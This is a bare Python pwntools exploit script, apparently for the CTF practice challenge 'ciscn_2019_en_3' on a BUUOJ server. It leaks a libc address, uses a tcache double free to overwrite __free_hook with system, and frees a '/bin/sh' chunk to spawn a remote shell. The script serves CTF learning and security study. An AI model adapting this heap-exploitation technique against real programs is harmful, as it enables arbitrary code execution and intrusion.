#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/05/26 21:57:02
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''

# here put the import lib

from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process("ciscn_2019_en_3")
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    IP = 'node3.buuoj.cn'
    port = 25268
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/18-64-libc-2.27.so')



elf = ELF("ciscn_2019_en_3")

def cmd(choice):
    sh.recvuntil("Input your choice:")
    sh.sendline(str(choice))
    
def add(size,content):
    cmd(1)
    sh.recvuntil("Please input the size of story: \n")
    sh.sendline(str(size))
    sh.recvuntil("please inpute the story: \n")
    sh.sendline(content)

def dele(index):
    cmd(4)
    sh.recvuntil("Please input the index:")
    sh.sendline(str(index))

sh.recvuntil("What's your name?\n")
sh.sendline("aaaa")
sh.recvuntil("Please input your ID.\n")
sh.send("aaaaaaaa")
sh.recvuntil("aaaaaaaa")
libc_base = u64(sh.recv(6).ljust(8,"\x00")) - libc.symbols['setbuffer'] - 231
free_hook = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
log.info("Success leak libc_base:0x%x"%libc_base)
# gdb.attach(sh)
# pause()
add(0x20,"aaaa")
add(0x20,"/bin/sh\x00")
dele(0)
dele(0)
add(0x20,p64(free_hook))
add(0x20,"aaaa")
add(0x20,p64(system_addr))
dele(1)
sh.interactive()